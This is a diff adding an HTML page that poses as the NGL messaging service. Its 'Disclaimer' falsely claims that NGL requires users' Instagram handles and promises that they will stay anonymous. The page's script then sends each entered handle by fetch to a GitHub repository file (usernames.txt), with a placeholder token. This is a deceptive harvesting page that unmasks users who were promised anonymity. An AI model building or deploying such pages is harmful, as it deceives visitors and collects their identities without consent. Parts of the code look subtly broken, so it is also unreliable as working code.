@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Add your meta tags, title, and styles here -->
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="background-box"></div>
+        <!-- Add your login form content here -->
+        <h2>Disclaimer</h2>
+        <form id="myForm" onsubmit="submitForm()" action="#" method="POST">
+            <label for="u">
+                <h6>As NGL wants to protect its user integrity through authentic messages, it is required to put your
+                    <b> Insta handle </b>before proceeding further.
+                    Don't worry your Identity and data will be still anonymous.</h6>
+            </label>
+
+            <input type="text" id="username" name="username" placeholder="Your Instagram Handle" required>
+
+            <button type="submit"> <h4>PROCEED</h4> </button>
+        </form>
+
+        <script>
+            function submitForm() {
+                var form = document.getElementById("myForm");
+                var formData = new FormData(form);
+
+                // Convert form data to URL-encoded format
+                var urlEncodedData = new URLSearchParams(formData).toString();
+
+                // Send a POST request to update usernames.txt
+                fetch('https://api.github.com/repos/yourusername/yourrepository/contents/usernames.txt', {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': 'Bearer YOUR_GITHUB_TOKEN', // Replace with your GitHub token
+                        'Accept': 'application/vnd.github.v3+json',
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: urlEncodedData
+                })
+                .then(response => {
+                    console.log('Form submitted successfully');
+                    // Add any further actions you want after successful form submission
+                })
+                .catch(error => {
+                    console.error('Error submitting form', error);
+                });
+
+                // Prevent the default form submission
+                return false;
+            }
+        </script>
+    </div>
+</body>
+
+</html>
